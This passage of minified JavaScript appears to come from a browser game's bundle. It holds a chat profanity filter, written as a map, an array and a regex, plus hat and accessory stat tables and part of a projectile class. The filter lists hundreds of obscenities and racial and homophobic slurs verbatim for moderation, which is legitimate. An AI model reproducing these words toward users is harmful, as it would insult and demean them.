                        balls: 1,
                        ballsack: 1,
                        bastard: 1,
                        beastial: 1,
                        beastiality: 1,
                        bellend: 1,
                        bestial: 1,
                        bestiality: 1,
                        "bi+ch": 1,
                        biatch: 1,
                        bitch: 1,
                        bitcher: 1,
                        bitchers: 1,
                        bitches: 1,
                        bitchin: 1,
                        bitching: 1,
                        bloody: 1,
                        "blow job": 1,
                        blowjob: 1,
                        blowjobs: 1,
                        boiolas: 1,
                        bollock: 1,
                        bollok: 1,
                        boner: 1,
                        boob: 1,
                        boobs: 1,
                        booobs: 1,
                        boooobs: 1,
                        booooobs: 1,
                        booooooobs: 1,
                        breasts: 1,
                        buceta: 1,
                        bugger: 1,
                        bum: 1,
                        "bunny fucker": 1,
                        butt: 1,
                        butthole: 1,
                        buttmuch: 1,
                        buttplug: 1,
                        c0ck: 1,
                        c0cksucker: 1,
                        "carpet muncher": 1,
                        cawk: 1,
                        chink: 1,
                        cipa: 1,
                        cl1t: 1,
                        clit: 1,
                        clitoris: 1,
                        clits: 1,
                        cnut: 1,
                        cock: 1,
                        "cock-sucker": 1,
                        cockface: 1,
                        cockhead: 1,
                        cockmunch: 1,
                        cockmuncher: 1,
                        cocks: 1,
                        cocksuck: 1,
                        cocksucked: 1,
                        cocksucker: 1,
                        cocksucking: 1,
                        cocksucks: 1,
                        cocksuka: 1,
                        cocksukka: 1,
                        cok: 1,
                        cokmuncher: 1,
                        coksucka: 1,
                        coon: 1,
                        cox: 1,
                        crap: 1,
                        cum: 1,
                        cummer: 1,
                        cumming: 1,
                        cums: 1,
                        cumshot: 1,
                        cunilingus: 1,
                        cunillingus: 1,
                        cunnilingus: 1,
                        cunt: 1,
                        cuntlick: 1,
                        cuntlicker: 1,
                        cuntlicking: 1,
                        cunts: 1,
                        cyalis: 1,
                        cyberfuc: 1,
                        cyberfuck: 1,
                        cyberfucked: 1,
                        cyberfucker: 1,
                        cyberfuckers: 1,
                        cyberfucking: 1,
                        d1ck: 1,
                        damn: 1,
                        dick: 1,
                        dickhead: 1,
                        dildo: 1,
                        dildos: 1,
                        dink: 1,
                        dinks: 1,
                        dirsa: 1,
                        dlck: 1,
                        "dog-fucker": 1,
                        doggin: 1,
                        dogging: 1,
                        donkeyribber: 1,
                        doosh: 1,
                        duche: 1,
                        dyke: 1,
                        ejaculate: 1,
                        ejaculated: 1,
                        ejaculates: 1,
                        ejaculating: 1,
                        ejaculatings: 1,
                        ejaculation: 1,
                        ejakulate: 1,
                        "f u c k": 1,
                        "f u c k e r": 1,
                        f4nny: 1,
                        fag: 1,
                        fagging: 1,
                        faggitt: 1,
                        faggot: 1,
                        faggs: 1,
                        fagot: 1,
                        fagots: 1,
                        fags: 1,
                        fanny: 1,
                        fannyflaps: 1,
                        fannyfucker: 1,
                        fanyy: 1,
                        fatass: 1,
                        fcuk: 1,
                        fcuker: 1,
                        fcuking: 1,
                        feck: 1,
                        fecker: 1,
                        felching: 1,
                        fellate: 1,
                        fellatio: 1,
                        fingerfuck: 1,
                        fingerfucked: 1,
                        fingerfucker: 1,
                        fingerfuckers: 1,
                        fingerfucking: 1,
                        fingerfucks: 1,
                        fistfuck: 1,
                        fistfucked: 1,
                        fistfucker: 1,
                        fistfuckers: 1,
                        fistfucking: 1,
                        fistfuckings: 1,
                        fistfucks: 1,
                        flange: 1,
                        fook: 1,
                        fooker: 1,
                        fuck: 1,
                        fucka: 1,
                        fucked: 1,
                        fucker: 1,
                        fuckers: 1,
                        fuckhead: 1,
                        fuckheads: 1,
                        fuckin: 1,
                        fucking: 1,
                        fuckings: 1,
                        fuckingshitmotherfucker: 1,
                        fuckme: 1,
                        fucks: 1,
                        fuckwhit: 1,
                        fuckwit: 1,
                        "fudge packer": 1,
                        fudgepacker: 1,
                        fuk: 1,
                        fuker: 1,
                        fukker: 1,
                        fukkin: 1,
                        fuks: 1,
                        fukwhit: 1,
                        fukwit: 1,
                        fux: 1,
                        fux0r: 1,
                        f_u_c_k: 1,
                        gangbang: 1,
                        gangbanged: 1,
                        gangbangs: 1,
                        gaylord: 1,
                        gaysex: 1,
                        goatse: 1,
                        God: 1,
                        "god-dam": 1,
                        "god-damned": 1,
                        goddamn: 1,
                        goddamned: 1,
                        hardcoresex: 1,
                        hell: 1,
                        heshe: 1,
                        hoar: 1,
                        hoare: 1,
                        hoer: 1,
                        homo: 1,
                        hore: 1,
                        horniest: 1,
                        horny: 1,
                        hotsex: 1,
                        "jack-off": 1,
                        jackoff: 1,
                        jap: 1,
                        "jerk-off": 1,
                        jism: 1,
                        jiz: 1,
                        jizm: 1,
                        jizz: 1,
                        kawk: 1,
                        knob: 1,
                        knobead: 1,
                        knobed: 1,
                        knobend: 1,
                        knobhead: 1,
                        knobjocky: 1,
                        knobjokey: 1,
                        kock: 1,
                        kondum: 1,
                        kondums: 1,
                        kum: 1,
                        kummer: 1,
                        kumming: 1,
                        kums: 1,
                        kunilingus: 1,
                        "l3i+ch": 1,
                        l3itch: 1,
                        labia: 1,
                        lust: 1,
                        lusting: 1,
                        m0f0: 1,
                        m0fo: 1,
                        m45terbate: 1,
                        ma5terb8: 1,
                        ma5terbate: 1,
                        masochist: 1,
                        "master-bate": 1,
                        masterb8: 1,
                        "masterbat*": 1,
                        masterbat3: 1,
                        masterbate: 1,
                        masterbation: 1,
                        masterbations: 1,
                        masturbate: 1,
                        "mo-fo": 1,
                        mof0: 1,
                        mofo: 1,
                        mothafuck: 1,
                        mothafucka: 1,
                        mothafuckas: 1,
                        mothafuckaz: 1,
                        mothafucked: 1,
                        mothafucker: 1,
                        mothafuckers: 1,
                        mothafuckin: 1,
                        mothafucking: 1,
                        mothafuckings: 1,
                        mothafucks: 1,
                        "mother fucker": 1,
                        motherfuck: 1,
                        motherfucked: 1,
                        motherfucker: 1,
                        motherfuckers: 1,
                        motherfuckin: 1,
                        motherfucking: 1,
                        motherfuckings: 1,
                        motherfuckka: 1,
                        motherfucks: 1,
                        muff: 1,
                        mutha: 1,
                        muthafecker: 1,
                        muthafuckker: 1,
                        muther: 1,
                        mutherfucker: 1,
                        n1gga: 1,
                        n1gger: 1,
                        nazi: 1,
                        nigg3r: 1,
                        nigg4h: 1,
                        nigga: 1,
                        niggah: 1,
                        niggas: 1,
                        niggaz: 1,
                        nigger: 1,
                        niggers: 1,
                        nob: 1,
                        "nob jokey": 1,
                        nobhead: 1,
                        nobjocky: 1,
                        nobjokey: 1,
                        numbnuts: 1,
                        nutsack: 1,
                        orgasim: 1,
                        orgasims: 1,
                        orgasm: 1,
                        orgasms: 1,
                        p0rn: 1,
                        pawn: 1,
                        pecker: 1,
                        penis: 1,
                        penisfucker: 1,
                        phonesex: 1,
                        phuck: 1,
                        phuk: 1,
                        phuked: 1,
                        phuking: 1,
                        phukked: 1,
                        phukking: 1,
                        phuks: 1,
                        phuq: 1,
                        pigfucker: 1,
                        pimpis: 1,
                        piss: 1,
                        pissed: 1,
                        pisser: 1,
                        pissers: 1,
                        pisses: 1,
                        pissflaps: 1,
                        pissin: 1,
                        pissing: 1,
                        pissoff: 1,
                        poop: 1,
                        porn: 1,
                        porno: 1,
                        pornography: 1,
                        pornos: 1,
                        prick: 1,
                        pricks: 1,
                        pron: 1,
                        pube: 1,
                        pusse: 1,
                        pussi: 1,
                        pussies: 1,
                        pussy: 1,
                        pussys: 1,
                        rectum: 1,
                        retard: 1,
                        rimjaw: 1,
                        rimming: 1,
                        "s hit": 1,
                        "s.o.b.": 1,
                        sadist: 1,
                        schlong: 1,
                        screwing: 1,
                        scroat: 1,
                        scrote: 1,
                        scrotum: 1,
                        semen: 1,
                        sex: 1,
                        "sh!+": 1,
                        "sh!t": 1,
                        sh1t: 1,
                        shag: 1,
                        shagger: 1,
                        shaggin: 1,
                        shagging: 1,
                        shemale: 1,
                        "shi+": 1,
                        shit: 1,
                        shitdick: 1,
                        shite: 1,
                        shited: 1,
                        shitey: 1,
                        shitfuck: 1,
                        shitfull: 1,
                        shithead: 1,
                        shiting: 1,
                        shitings: 1,
                        shits: 1,
                        shitted: 1,
                        shitter: 1,
                        shitters: 1,
                        shitting: 1,
                        shittings: 1,
                        shitty: 1,
                        skank: 1,
                        slut: 1,
                        sluts: 1,
                        smegma: 1,
                        smut: 1,
                        snatch: 1,
                        "son-of-a-bitch": 1,
                        spac: 1,
                        spunk: 1,
                        s_h_i_t: 1,
                        t1tt1e5: 1,
                        t1tties: 1,
                        teets: 1,
                        teez: 1,
                        testical: 1,
                        testicle: 1,
                        tit: 1,
                        titfuck: 1,
                        tits: 1,
                        titt: 1,
                        tittie5: 1,
                        tittiefucker: 1,
                        titties: 1,
                        tittyfuck: 1,
                        tittywank: 1,
                        titwank: 1,
                        tosser: 1,
                        turd: 1,
                        tw4t: 1,
                        twat: 1,
                        twathead: 1,
                        twatty: 1,
                        twunt: 1,
                        twunter: 1,
                        v14gra: 1,
                        v1gra: 1,
                        vagina: 1,
                        viagra: 1,
                        vulva: 1,
                        w00se: 1,
                        wang: 1,
                        wank: 1,
                        wanker: 1,
                        wanky: 1,
                        whoar: 1,
                        whore: 1,
                        willies: 1,
                        willy: 1,
                        xrated: 1,
                        xxx: 1
                    }
                }, function(e, t) {
                    e.exports = ["4r5e", "5h1t", "5hit", "a55", "anal", "anus", "ar5e", "arrse", "arse", "ass", "ass-fucker", "asses", "assfucker", "assfukka", "asshole", "assholes", "asswhole", "a_s_s", "b!tch", "b00bs", "b17ch", "b1tch", "ballbag", "balls", "ballsack", "bastard", "beastial", "beastiality", "bellend", "bestial", "bestiality", "bi+ch", "biatch", "bitch", "bitcher", "bitchers", "bitches", "bitchin", "bitching", "bloody", "blow job", "blowjob", "blowjobs", "boiolas", "bollock", "bollok", "boner", "boob", "boobs", "booobs", "boooobs", "booooobs", "booooooobs", "breasts", "buceta", "bugger", "bum", "bunny fucker", "butt", "butthole", "buttmuch", "buttplug", "c0ck", "c0cksucker", "carpet muncher", "cawk", "chink", "cipa", "cl1t", "clit", "clitoris", "clits", "cnut", "cock", "cock-sucker", "cockface", "cockhead", "cockmunch", "cockmuncher", "cocks", "cocksuck", "cocksucked", "cocksucker", "cocksucking", "cocksucks", "cocksuka", "cocksukka", "cok", "cokmuncher", "coksucka", "coon", "cox", "crap", "cum", "cummer", "cumming", "cums", "cumshot", "cunilingus", "cunillingus", "cunnilingus", "cunt", "cuntlick", "cuntlicker", "cuntlicking", "cunts", "cyalis", "cyberfuc", "cyberfuck", "cyberfucked", "cyberfucker", "cyberfuckers", "cyberfucking", "d1ck", "damn", "dick", "dickhead", "dildo", "dildos", "dink", "dinks", "dirsa", "dlck", "dog-fucker", "doggin", "dogging", "donkeyribber", "doosh", "duche", "dyke", "ejaculate", "ejaculated", "ejaculates", "ejaculating", "ejaculatings", "ejaculation", "ejakulate", "f u c k", "f u c k e r", "f4nny", "fag", "fagging", "faggitt", "faggot", "faggs", "fagot", "fagots", "fags", "fanny", "fannyflaps", "fannyfucker", "fanyy", "fatass", "fcuk", "fcuker", "fcuking", "feck", "fecker", "felching", "fellate", "fellatio", "fingerfuck", "fingerfucked", "fingerfucker", "fingerfuckers", "fingerfucking", "fingerfucks", "fistfuck", "fistfucked", "fistfucker", "fistfuckers", "fistfucking", "fistfuckings", "fistfucks", "flange", "fook", "fooker", "fuck", "fucka", "fucked", "fucker", "fuckers", "fuckhead", "fuckheads", "fuckin", "fucking", "fuckings", "fuckingshitmotherfucker", "fuckme", "fucks", "fuckwhit", "fuckwit", "fudge packer", "fudgepacker", "fuk", "fuker", "fukker", "fukkin", "fuks", "fukwhit", "fukwit", "fux", "fux0r", "f_u_c_k", "gangbang", "gangbanged", "gangbangs", "gaylord", "gaysex", "goatse", "God", "god-dam", "god-damned", "goddamn", "goddamned", "hardcoresex", "hell", "heshe", "hoar", "hoare", "hoer", "homo", "hore", "horniest", "horny", "hotsex", "jack-off", "jackoff", "jap", "jerk-off", "jism", "jiz", "jizm", "jizz", "kawk", "knob", "knobead", "knobed", "knobend", "knobhead", "knobjocky", "knobjokey", "kock", "kondum", "kondums", "kum", "kummer", "kumming", "kums", "kunilingus", "l3i+ch", "l3itch", "labia", "lust", "lusting", "m0f0", "m0fo", "m45terbate", "ma5terb8", "ma5terbate", "masochist", "master-bate", "masterb8", "masterbat*", "masterbat3", "masterbate", "masterbation", "masterbations", "masturbate", "mo-fo", "mof0", "mofo", "mothafuck", "mothafucka", "mothafuckas", "mothafuckaz", "mothafucked", "mothafucker", "mothafuckers", "mothafuckin", "mothafucking", "mothafuckings", "mothafucks", "mother fucker", "motherfuck", "motherfucked", "motherfucker", "motherfuckers", "motherfuckin", "motherfucking", "motherfuckings", "motherfuckka", "motherfucks", "muff", "mutha", "muthafecker", "muthafuckker", "muther", "mutherfucker", "n1gga", "n1gger", "nazi", "nigg3r", "nigg4h", "nigga", "niggah", "niggas", "niggaz", "nigger", "niggers", "nob", "nob jokey", "nobhead", "nobjocky", "nobjokey", "numbnuts", "nutsack", "orgasim", "orgasims", "orgasm", "orgasms", "p0rn", "pawn", "pecker", "penis", "penisfucker", "phonesex", "phuck", "phuk", "phuked", "phuking", "phukked", "phukking", "phuks", "phuq", "pigfucker", "pimpis", "piss", "pissed", "pisser", "pissers", "pisses", "pissflaps", "pissin", "pissing", "pissoff", "poop", "porn", "porno", "pornography", "pornos", "prick", "pricks", "pron", "pube", "pusse", "pussi", "pussies", "pussy", "pussys", "rectum", "retard", "rimjaw", "rimming", "s hit", "s.o.b.", "sadist", "schlong", "screwing", "scroat", "scrote", "scrotum", "semen", "sex", "sh!+", "sh!t", "sh1t", "shag", "shagger", "shaggin", "shagging", "shemale", "shi+", "shit", "shitdick", "shite", "shited", "shitey", "shitfuck", "shitfull", "shithead", "shiting", "shitings", "shits", "shitted", "shitter", "shitters", "shitting", "shittings", "shitty", "skank", "slut", "sluts", "smegma", "smut", "snatch", "son-of-a-bitch", "spac", "spunk", "s_h_i_t", "t1tt1e5", "t1tties", "teets", "teez", "testical", "testicle", "tit", "titfuck", "tits", "titt", "tittie5", "tittiefucker", "titties", "tittyfuck", "tittywank", "titwank", "tosser", "turd", "tw4t", "twat", "twathead", "twatty", "twunt", "twunter", "v14gra", "v1gra", "vagina", "viagra", "vulva", "w00se", "wang", "wank", "wanker", "wanky", "whoar", "whore", "willies", "willy", "xrated", "xxx"]
                }, function(e, t) {
                    e.exports = /\b(4r5e|5h1t|5hit|a55|anal|anus|ar5e|arrse|arse|ass|ass-fucker|asses|assfucker|assfukka|asshole|assholes|asswhole|a_s_s|b!tch|b00bs|b17ch|b1tch|ballbag|balls|ballsack|bastard|beastial|beastiality|bellend|bestial|bestiality|bi\+ch|biatch|bitch|bitcher|bitchers|bitches|bitchin|bitching|bloody|blow job|blowjob|blowjobs|boiolas|bollock|bollok|boner|boob|boobs|booobs|boooobs|booooobs|booooooobs|breasts|buceta|bugger|bum|bunny fucker|butt|butthole|buttmuch|buttplug|c0ck|c0cksucker|carpet muncher|cawk|chink|cipa|cl1t|clit|clitoris|clits|cnut|cock|cock-sucker|cockface|cockhead|cockmunch|cockmuncher|cocks|cocksuck|cocksucked|cocksucker|cocksucking|cocksucks|cocksuka|cocksukka|cok|cokmuncher|coksucka|coon|cox|crap|cum|cummer|cumming|cums|cumshot|cunilingus|cunillingus|cunnilingus|cunt|cuntlick|cuntlicker|cuntlicking|cunts|cyalis|cyberfuc|cyberfuck|cyberfucked|cyberfucker|cyberfuckers|cyberfucking|d1ck|damn|dick|dickhead|dildo|dildos|dink|dinks|dirsa|dlck|dog-fucker|doggin|dogging|donkeyribber|doosh|duche|dyke|ejaculate|ejaculated|ejaculates|ejaculating|ejaculatings|ejaculation|ejakulate|f u c k|f u c k e r|f4nny|fag|fagging|faggitt|faggot|faggs|fagot|fagots|fags|fanny|fannyflaps|fannyfucker|fanyy|fatass|fcuk|fcuker|fcuking|feck|fecker|felching|fellate|fellatio|fingerfuck|fingerfucked|fingerfucker|fingerfuckers|fingerfucking|fingerfucks|fistfuck|fistfucked|fistfucker|fistfuckers|fistfucking|fistfuckings|fistfucks|flange|fook|fooker|fuck|fucka|fucked|fucker|fuckers|fuckhead|fuckheads|fuckin|fucking|fuckings|fuckingshitmotherfucker|fuckme|fucks|fuckwhit|fuckwit|fudge packer|fudgepacker|fuk|fuker|fukker|fukkin|fuks|fukwhit|fukwit|fux|fux0r|f_u_c_k|gangbang|gangbanged|gangbangs|gaylord|gaysex|goatse|God|god-dam|god-damned|goddamn|goddamned|hardcoresex|hell|heshe|hoar|hoare|hoer|homo|hore|horniest|horny|hotsex|jack-off|jackoff|jap|jerk-off|jism|jiz|jizm|jizz|kawk|knob|knobead|knobed|knobend|knobhead|knobjocky|knobjokey|kock|kondum|kondums|kum|kummer|kumming|kums|kunilingus|l3i\+ch|l3itch|labia|lust|lusting|m0f0|m0fo|m45terbate|ma5terb8|ma5terbate|masochist|master-bate|masterb8|masterbat*|masterbat3|masterbate|masterbation|masterbations|masturbate|mo-fo|mof0|mofo|mothafuck|mothafucka|mothafuckas|mothafuckaz|mothafucked|mothafucker|mothafuckers|mothafuckin|mothafucking|mothafuckings|mothafucks|mother fucker|motherfuck|motherfucked|motherfucker|motherfuckers|motherfuckin|motherfucking|motherfuckings|motherfuckka|motherfucks|muff|mutha|muthafecker|muthafuckker|muther|mutherfucker|n1gga|n1gger|nazi|nigg3r|nigg4h|nigga|niggah|niggas|niggaz|nigger|niggers|nob|nob jokey|nobhead|nobjocky|nobjokey|numbnuts|nutsack|orgasim|orgasims|orgasm|orgasms|p0rn|pawn|pecker|penis|penisfucker|phonesex|phuck|phuk|phuked|phuking|phukked|phukking|phuks|phuq|pigfucker|pimpis|piss|pissed|pisser|pissers|pisses|pissflaps|pissin|pissing|pissoff|poop|porn|porno|pornography|pornos|prick|pricks|pron|pube|pusse|pussi|pussies|pussy|pussys|rectum|retard|rimjaw|rimming|s hit|s.o.b.|sadist|schlong|screwing|scroat|scrote|scrotum|semen|sex|sh!\+|sh!t|sh1t|shag|shagger|shaggin|shagging|shemale|shi\+|shit|shitdick|shite|shited|shitey|shitfuck|shitfull|shithead|shiting|shitings|shits|shitted|shitter|shitters|shitting|shittings|shitty|skank|slut|sluts|smegma|smut|snatch|son-of-a-bitch|spac|spunk|s_h_i_t|t1tt1e5|t1tties|teets|teez|testical|testicle|tit|titfuck|tits|titt|tittie5|tittiefucker|titties|tittyfuck|tittywank|titwank|tosser|turd|tw4t|twat|twathead|twatty|twunt|twunter|v14gra|v1gra|vagina|viagra|vulva|w00se|wang|wank|wanker|wanky|whoar|whore|willies|willy|xrated|xxx)\b/gi
                }, function(e, t) {
                    e.exports.hats = [{
                        id: 45,
                        name: "Shame!",
                        dontSell: !0,
                        price: 0,
                        scale: 120,
                        desc: "hacks are for losers"
                    }, {
                        id: 51,
                        name: "Moo Cap",
                        price: 0,
                        scale: 120,
                        desc: "coolest mooer around"
                    }, {
                        id: 50,
                        name: "Apple Cap",
                        price: 0,
                        scale: 120,
                        desc: "apple farms remembers"
                    }, {
                        id: 28,
                        name: "Moo Head",
                        price: 0,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 29,
                        name: "Pig Head",
                        price: 0,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 30,
                        name: "Fluff Head",
                        price: 0,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 36,
                        name: "Pandou Head",
                        price: 0,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 37,
                        name: "Bear Head",
                        price: 0,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 38,
                        name: "Monkey Head",
                        price: 0,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 44,
                        name: "Polar Head",
                        price: 0,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 35,
                        name: "Fez Hat",
                        price: 0,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 42,
                        name: "Enigma Hat",
                        price: 0,
                        scale: 120,
                        desc: "join the enigma army"
                    }, {
                        id: 43,
                        name: "Blitz Hat",
                        price: 0,
                        scale: 120,
                        desc: "hey everybody i'm blitz"
                    }, {
                        id: 49,
                        name: "Bob XIII Hat",
                        price: 0,
                        scale: 120,
                        desc: "like and subscribe"
                    }, {
                        id: 57,
                        name: "Pumpkin",
                        price: 50,
                        scale: 120,
                        desc: "Spooooky"
                    }, {
                        id: 8,
                        name: "Bummle Hat",
                        price: 100,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 2,
                        name: "Straw Hat",
                        price: 500,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 15,
                        name: "Winter Cap",
                        price: 600,
                        scale: 120,
                        desc: "allows you to move at normal speed in snow",
                        coldM: 1
                    }, {
                        id: 5,
                        name: "Cowboy Hat",
                        price: 1e3,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 4,
                        name: "Ranger Hat",
                        price: 2e3,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 18,
                        name: "Explorer Hat",
                        price: 2e3,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 31,
                        name: "Flipper Hat",
                        price: 2500,
                        scale: 120,
                        desc: "have more control while in water",
                        watrImm: !0
                    }, {
                        id: 1,
                        name: "Marksman Cap",
                        price: 3e3,
                        scale: 120,
                        desc: "increases arrow speed and range",
                        aMlt: 1.3
                    }, {
                        id: 10,
                        name: "Bush Gear",
                        price: 3e3,
                        scale: 160,
                        desc: "allows you to disguise yourself as a bush"
                    }, {
                        id: 48,
                        name: "Halo",
                        price: 3e3,
                        scale: 120,
                        desc: "no effect"
                    }, {
                        id: 6,
                        name: "Soldier Helmet",
                        price: 4e3,
                        scale: 120,
                        desc: "reduces damage taken but slows movement",
                        spdMult: .94,
                        dmgMult: .75
                    }, {
                        id: 23,
                        name: "Anti Venom Gear",
                        price: 4e3,
                        scale: 120,
                        desc: "makes you immune to poison",
                        poisonRes: 1
                    }, {
                        id: 13,
                        name: "Medic Gear",
                        price: 5e3,
                        scale: 110,
                        desc: "slowly regenerates health over time",
                        healthRegen: 3
                    }, {
                        id: 9,
                        name: "Miners Helmet",
                        price: 5e3,
                        scale: 120,
                        desc: "earn 1 extra gold per resource",
                        extraGold: 1
                    }, {
                        id: 32,
                        name: "Musketeer Hat",
                        price: 5e3,
                        scale: 120,
                        desc: "reduces cost of projectiles",
                        projCost: .5
                    }, {
                        id: 7,
                        name: "Bull Helmet",
                        price: 6e3,
                        scale: 120,
                        desc: "increases damage done but drains health",
                        healthRegen: -5,
                        dmgMultO: 1.5,
                        spdMult: .96
                    }, {
                        id: 22,
                        name: "Emp Helmet",
                        price: 6e3,
                        scale: 120,
                        desc: "turrets won't attack but you move slower",
                        antiTurret: 1,
                        spdMult: .7
                    }, {
                        id: 12,
                        name: "Booster Hat",
                        price: 6e3,
                        scale: 120,
                        desc: "increases your movement speed",
                        spdMult: 1.16
                    }, {
                        id: 26,
                        name: "Barbarian Armor",
                        price: 8e3,
                        scale: 120,
                        desc: "knocks back enemies that attack you",
                        dmgK: .6
                    }, {
                        id: 21,
                        name: "Plague Mask",
                        price: 1e4,
                        scale: 120,
                        desc: "melee attacks deal poison damage",
                        poisonDmg: 5,
                        poisonTime: 6
                    }, {
                        id: 46,
                        name: "Bull Mask",
                        price: 1e4,
                        scale: 120,
                        desc: "bulls won't target you unless you attack them",
                        bullRepel: 1
                    }, {
                        id: 14,
                        name: "Windmill Hat",
                        topSprite: !0,
                        price: 1e4,
                        scale: 120,
                        desc: "generates points while worn",
                        pps: 1.5
                    }, {
                        id: 11,
                        name: "Spike Gear",
                        topSprite: !0,
                        price: 1e4,
                        scale: 120,
                        desc: "deal damage to players that damage you",
                        dmg: .45
                    }, {
                        id: 53,
                        name: "Turret Gear",
                        topSprite: !0,
                        price: 1e4,
                        scale: 120,
                        desc: "you become a walking turret",
                        turret: {
                            proj: 1,
                            range: 700,
                            rate: 2500
                        },
                        spdMult: .7
                    }, {
                        id: 20,
                        name: "Samurai Armor",
                        price: 12e3,
                        scale: 120,
                        desc: "increased attack speed and fire rate",
                        atkSpd: .78
                    }, {
                        id: 58,
                        name: "Dark Knight",
                        price: 12e3,
                        scale: 120,
                        desc: "restores health when you deal damage",
                        healD: .4
                    }, {
                        id: 27,
                        name: "Scavenger Gear",
                        price: 15e3,
                        scale: 120,
                        desc: "earn double points for each kill",
                        kScrM: 2
                    }, {
                        id: 40,
                        name: "Tank Gear",
                        price: 15e3,
                        scale: 120,
                        desc: "increased damage to buildings but slower movement",
                        spdMult: .3,
                        bDmg: 3.3
                    }, {
                        id: 52,
                        name: "Thief Gear",
                        price: 15e3,
                        scale: 120,
                        desc: "steal half of a players gold when you kill them",
                        goldSteal: .5
                    }, {
                        id: 55,
                        name: "Bloodthirster",
                        price: 2e4,
                        scale: 120,
                        desc: "Restore Health when dealing damage. And increased damage",
                        healD: .25,
                        dmgMultO: 1.2
                    }, {
                        id: 56,
                        name: "Assassin Gear",
                        price: 2e4,
                        scale: 120,
                        desc: "Go invisible when not moving. Can't eat. Increased speed",
                        noEat: !0,
                        spdMult: 1.1,
                        invisTimer: 1e3
                    }], e.exports.accessories = [{
                        id: 12,
                        name: "Snowball",
                        price: 1e3,
                        scale: 105,
                        xOff: 18,
                        desc: "no effect"
                    }, {
                        id: 9,
                        name: "Tree Cape",
                        price: 1e3,
                        scale: 90,
                        desc: "no effect"
                    }, {
                        id: 10,
                        name: "Stone Cape",
                        price: 1e3,
                        scale: 90,
                        desc: "no effect"
                    }, {
                        id: 3,
                        name: "Cookie Cape",
                        price: 1500,
                        scale: 90,
                        desc: "no effect"
                    }, {
                        id: 8,
                        name: "Cow Cape",
                        price: 2e3,
                        scale: 90,
                        desc: "no effect"
                    }, {
                        id: 11,
                        name: "Monkey Tail",
                        price: 2e3,
                        scale: 97,
                        xOff: 25,
                        desc: "Super speed but reduced damage",
                        spdMult: 1.35,
                        dmgMultO: .2
                    }, {
                        id: 17,
                        name: "Apple Basket",
                        price: 3e3,
                        scale: 80,
                        xOff: 12,
                        desc: "slowly regenerates health over time",
                        healthRegen: 1
                    }, {
                        id: 6,
                        name: "Winter Cape",
                        price: 3e3,
                        scale: 90,
                        desc: "no effect"
                    }, {
                        id: 4,
                        name: "Skull Cape",
                        price: 4e3,
                        scale: 90,
                        desc: "no effect"
                    }, {
                        id: 5,
                        name: "Dash Cape",
                        price: 5e3,
                        scale: 90,
                        desc: "no effect"
                    }, {
                        id: 2,
                        name: "Dragon Cape",
                        price: 6e3,
                        scale: 90,
                        desc: "no effect"
                    }, {
                        id: 1,
                        name: "Super Cape",
                        price: 8e3,
                        scale: 90,
                        desc: "no effect"
                    }, {
                        id: 7,
                        name: "Troll Cape",
                        price: 8e3,
                        scale: 90,
                        desc: "no effect"
                    }, {
                        id: 14,
                        name: "Thorns",
                        price: 1e4,
                        scale: 115,
                        xOff: 20,
                        desc: "no effect"
                    }, {
                        id: 15,
                        name: "Blockades",
                        price: 1e4,
                        scale: 95,
                        xOff: 15,
                        desc: "no effect"
                    }, {
                        id: 20,
                        name: "Devils Tail",
                        price: 1e4,
                        scale: 95,
                        xOff: 20,
                        desc: "no effect"
                    }, {
                        id: 16,
                        name: "Sawblade",
                        price: 12e3,
                        scale: 90,
                        spin: !0,
                        xOff: 0,
                        desc: "deal damage to players that damage you",
                        dmg: .15
                    }, {
                        id: 13,
                        name: "Angel Wings",
                        price: 15e3,
                        scale: 138,
                        xOff: 22,
                        desc: "slowly regenerates health over time",
                        healthRegen: 3
                    }, {
                        id: 19,
                        name: "Shadow Wings",
                        price: 15e3,
                        scale: 138,
                        xOff: 22,
                        desc: "increased movement speed",
                        spdMult: 1.1
                    }, {
                        id: 18,
                        name: "Blood Wings",
                        price: 2e4,
                        scale: 178,
                        xOff: 26,
                        desc: "restores health when you deal damage",
                        healD: .2
                    }, {
                        id: 21,
                        name: "Corrupt X Wings",
                        price: 2e4,
                        scale: 178,
                        xOff: 26,
                        desc: "deal damage to players that damage you",
                        dmg: .25
                    }]
                }, function(e, t) {
                    e.exports = function(e, t, n, i, r, s, a) {
                        this.init = function(e, t, n, i, r, s, o, c, l) {
                            this.active = !0, this.indx = e, this.x = t, this.y = n, this.dir = i, this.skipMov = !0, this.speed = r, this.dmg = s, this.scale = c, this.range = o, this.owner = l, a && (this.sentTo = {})
                        };
                        var o, c = [];
                        this.update = function(l) {
                            if (this.active) {
                                var h, u = this.speed * l;
                                if (this.skipMov ? this.skipMov = !1 : (this.x += u * Math.cos(this.dir), this.y += u * Math.sin(this.dir), this.range -= u, this.range <= 0 && (this.x += this.range * Math.cos(this.dir), this.y += this.range * Math.sin(this.dir), u = 1, this.range = 0, this.active = !1)), a) {
                                    for (var f = 0; f < e.length; ++f) !this.sentTo[e[f].id] && e[f].canSee(this) && (this.sentTo[e[f].id] = 1, a.send(e[f].id, "18", s.fixTo(this.x, 1), s.fixTo(this.y, 1), s.fixTo(this.dir, 2), s.fixTo(this.range, 1), this.speed, this.indx, this.layer, this.sid));
                                    for (c.length = 0, f = 0; f < e.length + t.length; ++f) !(o = e[f] || t[f - e.length]).alive || o == this.owner || this.owner.team && o.team == this.owner.team || s.lineInRect(o.x - o.scale, o.y - o.scale, o.x + o.scale, o.y + o.scale, this.x, this.y, this.x + u * Math.cos(this.dir), this.y + u * Math.sin(this.dir)) && c.push(o);
                                    for (var d = n.getGridArrays(this.x, this.y, this.scale), p = 0; p < d.length; ++p)
